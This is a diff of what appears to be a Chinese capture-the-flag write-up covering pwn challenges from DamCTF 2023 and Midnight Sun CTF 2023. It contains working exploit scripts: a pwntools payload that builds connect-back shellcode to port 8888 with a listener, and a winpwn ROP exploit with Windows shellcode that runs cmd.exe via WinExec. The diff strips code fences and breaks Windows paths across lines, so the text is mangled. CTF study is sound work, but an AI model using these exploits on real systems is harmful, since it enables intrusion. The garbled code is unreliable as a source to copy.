@@ -339,7 +339,8 @@ Category: pwn
 
 Author: larsh
 
-Simple buffer overflow, but not your normal Linux system! Flag in c:flag.txt
+Simple buffer overflow, but not your normal Linux system! Flag in c:
+flag.txt
 
 附件
 https://github.com/X1ngn/ctf/blob/master/chall.exe
@@ -444,9 +445,11 @@ self.sock.settimeout(self._timeout)
 
 检查保护，在下好的winchecksec的目录中找到buildReleasewinchecksec.exe
 
-> winchecksec.exe C:UsersorigiDesktopchall.exe
+> winchecksec.exe C:
+UsersorigiDesktopchall.exe
 Warn: No load config in the PE
-Results for: C:UsersorigiDesktopchall.exe
+Results for: C:
+UsersorigiDesktopchall.exe
 Dynamic Base : "NotPresent"
 ASLR : "NotPresent"
 High Entropy VA : "NotPresent"
@@ -481,7 +484,8 @@ def get_sh():
 if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE':
 return remote(sys.argv[2], sys.argv[3])
 else:
-return process(r"C:UsersorigiDesktopchall.exe")
+return process(r"C:
+UsersorigiDesktopchall.exe")
 
 def get_gdb(sh, stop=False):
 x64dbg.attach(sh)
@@ -548,20 +552,10 @@ https://bbs.kanxue.com/user-home-869963.htm
 ```
 一
 DamCTF 2023 Quals
-```
-
-
-
-```
 // Get choice from user
 gets(g.input_buf);
 // Allow either specifying the number or typing the description
 choice = atoi(g.input_buf) - 1;
-```
-
-
-
-```
 void print_location(location *l) {
 printf(l->description);
 if (l->end_location) {
@@ -571,11 +565,6 @@ for (int i = 0; i < l->num_choices; ++i) {
 printf("%d: %s", i + 1, l->choices[i].description);
 }
 }
-```
-
-
-
-```
 #!/usr/bin/python
 
 from pwn import *
@@ -643,18 +632,8 @@ return ''
 if __name__ == "__main__":
 
 flag = exp(0, 0)
-```
-
-
-
-```
 二
 scm
-```
-
-
-
-```
 '''
 type1
 Running shellcode... line CODE JT JF K
@@ -697,11 +676,6 @@ Running shellcode... line CODE JT JF K
 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0009: 0x06 0x00 0x00 0x00000000 return KILL
 '''
-```
-
-
-
-```
 unsigned int v2;
 ... ...
 fgets((char *)&v6, 49, stdin);
@@ -714,11 +688,6 @@ return 0;
 printf("Changing type to %dn", v2);
 *(_DWORD *)(a1 + 4) = v2;
 ... ...
-```
-
-
-
-```
 if ( !fork() )
 {
 close(2); //stderr
@@ -751,23 +720,8 @@ LABEL_12:
 goto LABEL_13;
 }
 wait((__WAIT_STATUS)stat_loc);
-```
-
-
-
-```
 code = asm(pwnlib.shellcraft.amd64.linux.connect(ip,port))
-```
-
-
-
-```
 code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))
-```
-
-
-
-```
 #!/usr/bin/python
 from pwn import *
 import sys
@@ -779,7 +733,7 @@ context.arch='amd64'
 code = asm(pwnlib.shellcraft.amd64.linux.connect('0.0.0.0',8888))
 code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))
 
-#code += asm(pwnlib.shellcraft.amd64.linux.sh())
+    #code += asm(pwnlib.shellcraft.amd64.linux.sh())
 shell='''
 xor rsi,rsi;
 xor rdx,rdx;
@@ -867,35 +821,15 @@ th.start()
 io = listen(8888)
 io.wait_for_connection()
 io.interactive()
-```
-
-
-
-```
 三
 Midnight Sun CTF 2023 Quals
-```
-
-
-
-```
 pip install pefile
 pip install keystone
 pip install capstone
 pip install winpwn
-```
-
-
-
-```
 python
 import winpwn
 winpwn.__file__
-```
-
-
-
-```
 debugger={
 'i386':{
 'windbg':'',
@@ -925,11 +859,6 @@ debugger_init={
 "windbgx":""
 }
 }
-```
-
-
-
-```
 class remote(tube):
 def __init__(self, ip, port, family = socket.AF_INET, socktype = socket.SOCK_STREAM):
 tube.__init__(self)
@@ -968,14 +897,11 @@ return False
 def timeout(self,timeout):
 self._timeout=timeout
 self.sock.settimeout(self._timeout)
-```
-
-
-
-```
-> winchecksec.exe C:UsersorigiDesktopchall.exe
+> winchecksec.exe C:
+UsersorigiDesktopchall.exe
 Warn: No load config in the PE
-Results for: C:UsersorigiDesktopchall.exe
+Results for: C:
+UsersorigiDesktopchall.exe
 Dynamic Base : "NotPresent"
 ASLR : "NotPresent"
 High Entropy VA : "NotPresent"
@@ -989,11 +915,6 @@ SafeSEH : "NotPresent"
 GS : "NotPresent"
 Authenticode : "NotPresent"
 .NET : "NotPresent"
-```
-
-
-
-```
 from winpwn import *
 import os
 import traceback
@@ -1008,7 +929,8 @@ def get_sh():
 if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE':
 return remote(sys.argv[2], sys.argv[3])
 else:
-return process(r"C:UsersorigiDesktopchall.exe")
+return process(r"C:
+UsersorigiDesktopchall.exe")
 
 def get_gdb(sh, stop=False):
 x64dbg.attach(sh)
@@ -1028,7 +950,7 @@ payload += p32(0x40263C) # gets
 payload += p32(bss)
 payload += p32(bss)
 
-#get_gdb(sh)
+    #get_gdb(sh)
 sh.sendline(payload)
 
 shellcode = "x31xc9x64x8bx41x30x8bx40x0cx8bx40x1cx8bx04x08x8bx04x08x8bx58x08x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x49x8bx72x24x01xdex66x8bx0cx4ex8bx72x1cx01xdex8bx14x8ex01xdax89xd6x31xc9x51x68x45x78x65x63x68x41x57x69x6ex89xe1x8dx49x01x51x53xffxd6x87xfax89xc7x31xc9x51x68x72x65x61x64x68x69x74x54x68x68x41x41x45x78x89xe1x8dx49x02x51x53xffxd6x89xc6x31xc9x51x68x65x78x65x20x68x63x6dx64x2ex89xe1x6ax01x51xffxd7x31xc9x51xffxd6"
